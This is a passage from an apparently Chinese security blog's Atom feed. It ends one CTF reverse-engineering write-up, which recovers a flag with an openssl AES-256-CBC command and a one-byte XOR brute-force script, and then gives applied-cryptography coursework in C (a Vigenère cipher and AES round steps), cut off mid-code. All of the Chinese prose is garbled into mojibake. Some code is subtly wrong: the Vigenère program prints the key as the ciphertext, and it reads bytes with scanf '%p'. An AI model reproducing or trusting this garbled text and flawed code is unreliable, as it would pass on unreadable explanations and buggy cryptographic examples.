å¯†ï¼Œæˆ‘ä»¬åªéœ€è¦æ‰¾å¯†é’¥ï¼Œivåœ¨è¿™é‡Œå°±æ˜¯ä¸éœ€è¦çš„ï¼Œå› ä¸ºivçš„é”™è¯¯åªä¼šå½±å“å‰16å­—èŠ‚çš„è§£å¯†ï¼Œæˆ‘ä»¬çŒœæµ‹ç¨‹åºçš„flagæ”¾åœ¨16å­—èŠ‚åï¼Œå› ä¸ºivæˆ‘æ²¡æ‰¾åˆ°ï¼Œæ„Ÿè§‰ä¸å¥½æ‰¾ã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªå¯¹<strong>GH65Hws2jedf3fl3MeK</strong>è¿›è¡Œmd5åŠ å¯†ï¼Œè¿½è¸ªå˜é‡ï¼Œå‘ç°å®ƒçš„ç»“æœæ˜¯ä½œä¸ºäº†åé¢aes_256_cbcçš„å¯†é’¥ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801101838900.png" alt="image-20210801101838900"></p><p>ä½†è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œmd5åŠ å¯†ç»“æœæ˜¯16å­—èŠ‚ï¼Œè€Œè¿™é‡Œå¯†é’¥æ˜¯256ä½çš„ï¼Œè¦32å­—èŠ‚å—¯ã€‚ã€‚</p><p>ç„¶åçœ‹çœ‹md5å‡½æ•°åŠå¤–é¢å–ç»“æœçš„å‡½æ•°ï¼š</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102132852-16283937318661.png" alt="image-20210801102132852"></p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102147464.png" alt="image-20210801102147464"></p><p>æ‰€ä»¥è¯´ï¼Œç¨‹åºæ˜¯ç›´æ¥ä½¿ç”¨çš„åŠ å¯†ç»“æœçš„hexå½¢å¼ä½œä¸º32ä½å¯†é’¥ã€‚</p><p>æ¥ä¸‹æ¥ä½¿ç”¨opensslæ¥è§£å¯†è¯•è¯•ï¼Œ-dï¼šè§£å¯†  -Kï¼šæŒ‡å®šå¯†é’¥ï¼Œ-ivï¼šæŒ‡å®šivï¼Œ-inï¼šæŒ‡å®šè¦åŠ å¯†æˆ–è§£å¯†çš„æ–‡ä»¶ï¼Œä¸”æ³¨æ„keyå’Œivè¦ä»¥hexå½¢å¼ç»™å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -<span class="keyword">in</span> flag.php &gt; ans.txt</span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼Œå¾—åˆ°ä¸€ä¸ªä¹±ç æ–‡ä»¶ã€‚</p><p>å†æ¬¡å›åˆ°ç¨‹åºä¸­åˆ†æåŠ å¯†å‡½æ•°ï¼šå‘ç°åœ¨åŠ å¯†ä¹‹åæœ‰ä¸€ä¸ªå¼‚æˆ–ï¼Œè§£å¯†ä¹‹å‰åŒæ ·å¯¹åº”ä¸€ä¸ªå¼‚æˆ–ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102919133.png" alt="image-20210801102919133"></p><p>è€Œè¿™ä¸ªv9ï¼Œæˆ‘å‘ä¸Šæ‰¾è¯¥å˜é‡çš„èµ‹å€¼åŠå›æº¯ï¼Œåœ¨è¯»æ–‡ä»¶è¿™é‡Œæ‰¾åˆ°ã€‚ã€‚ä½†è¿™ä¹Ÿæ˜¯ä¸çŸ¥é“çš„ã€‚</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801103055301.png" alt="image-20210801103055301"></p><p>å¥½åœ¨ä¸Šé¢å¼‚æˆ–çš„v9å˜é‡åªæ˜¯ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è€ƒè™‘çˆ†ç ´ï¼Œæ‰¾åˆ°flag/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"flag1.php"</span>, <span class="string">"rb"</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">f1 = open(<span class="string">'flag.php'</span>, <span class="string">"wb"</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> text:</span><br><span class="line">f1.write(bytes([j^i]))</span><br><span class="line">os.system(<span class="string">'openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -in flag.php &gt; ans.txt'</span>)</span><br><span class="line">a = open(<span class="string">'ans.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">ans = a.read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">print(<span class="string">"*"</span>*<span class="number">100</span>)</span><br><span class="line">print(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ç»“æœï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BD8hRUZflag&#123;47a3f7b1-499c-4e45-ed3e-404602cfef96&#125;<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo "</span>no my code&lt;/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;é€†å‘é¢˜è§£~&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>åº”ç”¨å¯†ç å­¦</title>
    <link href="https://www.bxnop.cn/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>https://www.bxnop.cn/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/</id>
    <published>2021-04-17T06:23:32.000Z</published>
    <updated>2021-04-18T02:08:13.431Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹åº”ç”¨å¯†ç å­¦è¯¾ç¨‹çš„ä»£ç ä½œä¸šåŠå®éªŒã€‚<a id="more"></a></p><h3 id="Vigenere-Cipher"><a href="#Vigenere-Cipher" class="headerlink" title="Vigenere Cipher"></a>Vigenere Cipher</h3><p>Cè¯­è¨€ç®€å•å®ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> plain[] = <span class="string">"blockchaintechnology"</span>, plain_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> key[] = <span class="string">"cuitbo"</span>, key_order[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> enc[<span class="number">100</span>], enc_order[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">plain_order[i] = plain[i]<span class="number">-97</span>;</span><br><span class="line">key_order[i] = key[i%<span class="number">6</span>]<span class="number">-97</span>;</span><br><span class="line">enc_order[i] = (plain_order[i]+key_order[i])%<span class="number">26</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain: %s\n"</span>, plain);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: %s\n"</span>, key);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"plain_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, plain_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc_order: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, enc_order[i]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"enc: "</span>);</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(plain)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c "</span>, enc_order[i]+<span class="number">97</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AES-å˜æ¢æ“ä½œçš„å®ç°"><a href="#AES-å˜æ¢æ“ä½œçš„å®ç°" class="headerlink" title="AES å˜æ¢æ“ä½œçš„å®ç°"></a>AES å˜æ¢æ“ä½œçš„å®ç°</h3><p>ç”¨Cè¯­è¨€ç®€å•å®ç°ä¸€ä¸‹åŠ å¯†çš„å‡ ä¸ªè¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddRoundKey_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*RoundKey_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShiftRows_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mix_columns_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> (*output_76)[<span class="number">4</span>])</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">gfmultby_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> a, <span class="keyword">unsigned</span> <span class="keyword">char</span> b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> Sbox_76[<span class="number">256</span>] = &#123;</span><br><span class="line"><span class="comment">// 0     1     2     3     4     5     6     7     8     9     a     b     c     d     e     f</span></span><br><span class="line"><span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="comment">// 0</span></span><br><span class="line"><span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="comment">// 1</span></span><br><span class="line"><span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="comment">// 2</span></span><br><span class="line"><span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="comment">// 3</span></span><br><span class="line"><span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="comment">// 4</span></span><br><span class="line"><span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="comment">// 5</span></span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="comment">// 6</span></span><br><span class="line"><span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="comment">// 7</span></span><br><span class="line"><span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="comment">// 8</span></span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="comment">// 9</span></span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="comment">// a</span></span><br><span class="line"><span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="comment">// b</span></span><br><span class="line"><span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="comment">// c</span></span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="comment">// d</span></span><br><span class="line"><span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="comment">// e</span></span><br><span class="line"><span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>&#125;;<span class="comment">// f</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mixValue_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>, <span class="number">01</span>,</span><br><span class="line">   <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span>, <span class="number">03</span>,</span><br><span class="line">   <span class="number">03</span>, <span class="number">01</span>, <span class="number">01</span>, <span class="number">02</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> state_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> output_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> RoundKey_76[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"æ˜æ–‡ï¼š"</span>);</span><br><span class="line">getData_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"å¯†é’¥ï¼š"</span>);</span><br><span class="line">getData_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¾“å…¥æ˜æ–‡çŠ¶æ€çŸ©é˜µï¼š"</span>);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¾“å…¥128æ¯”ç‰¹åˆå§‹å¯†é’¥çŸ©é˜µï¼š"</span>);</span><br><span class="line">printOut_76(RoundKey_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è½®å¯†é’¥è¿ç®—è¾“å‡ºï¼š"</span>);</span><br><span class="line">AddRoundKey_76(state_76, RoundKey_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"å­—èŠ‚æ›¿ä»£è¾“å‡ºï¼š"</span>);</span><br><span class="line">SubBytes_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"è¡Œç§»ä½è¾“å‡ºï¼š"</span>);</span><br><span class="line">ShiftRows_76(state_76);</span><br><span class="line">printOut_76(state_76);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"åˆ—æ··åˆè¾“å‡ºï¼š"</span>);</span><br><span class="line">mix_columns_76(state_76, output_76);</span><br><span class="line">printOut_76(output_76);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getData_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> input_76[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">16</span>; i_76++)</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%p"</span>, input_76+i_76);</span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line">&#123;</span><br><span class="line">data_76[j_76][i_76] = input_76[<span class="number">4</span>*i_76+j_76];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printOut_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*data_76)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i_76, j_76;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i_76 = <span class="number">0</span>; i_76 &lt; <span class="number">4</span>; i_76++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j_76 = <span class="number">0</span>; j_76 &lt; <span class="number">4</span>; j_76++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%02X "</span>, data_76[i_76][j_76]);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SubBytes_76</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> (*state_76)[<span class="number">4</span>])</span></span></span><br><span 